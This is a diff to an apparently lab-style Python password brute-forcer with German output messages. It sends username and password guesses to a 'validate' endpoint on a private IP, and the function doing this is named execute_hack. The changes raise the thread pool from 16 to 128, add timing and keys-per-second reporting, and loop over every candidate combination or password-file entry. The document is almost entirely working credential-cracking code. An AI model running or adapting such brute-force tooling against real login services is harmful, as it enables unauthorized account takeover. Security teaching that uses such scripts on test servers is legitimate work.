@@ -2,8 +2,9 @@
 import itertools
 import requests
 from multiprocessing.dummy import Pool as ThreadPool
+import time
 
-pool = ThreadPool(16)
+pool = ThreadPool(128)
 user_input = input('Nutzername: ')
 user_array = ['bob', 'ute', 'paul']
 combination_array = []
@@ -48,7 +49,6 @@ url = 'http://172.50.1.5:8080/validate?'
 
 
 def execute_hack(x):
-
     combinations = combination_array
 
     if user_input == 'joe':
@@ -62,6 +62,9 @@ def execute_hack(x):
             print('Versuchsnummer: ' + str(x))
             print(user_input + ' ' + passwords[x])
             print(r.text)
+            elapsed_time = time.time() - start_time
+            print('Gebrauchte Zeit zum Knacken: ' + str(elapsed_time))
+            print('Getestete Keys pro Sekunde: ' + str(x/elapsed_time))
 
     else:
 
@@ -75,6 +78,9 @@ def execute_hack(x):
             print('Versuchsnummer: ' + str(x))
             print(user_input + ' ' + ''.join(combinations[x]))
             print(r.text)
+            elapsed_time = time.time() - start_time
+            print('Gebrauchte Zeit zum Knacken: ' + str(elapsed_time))
+            print('Getestete Keys pro Sekunde: ' + str(x/elapsed_time))
 
 
 if user_input != 'joe':
@@ -100,8 +106,14 @@ for line in f:
     passwords.append(columns[3])
 
 f.close()
+start_time = time.time()
 
-results = pool.imap(execute_hack, range(3844))
+if user_input == 'joe':
+    range_iteration = range(len(passwords))
+else:
+    range_iteration = range(len(combination_array))
+
+results_for = pool.map(execute_hack, range_iteration)
 
 pool.close()
 pool.join()
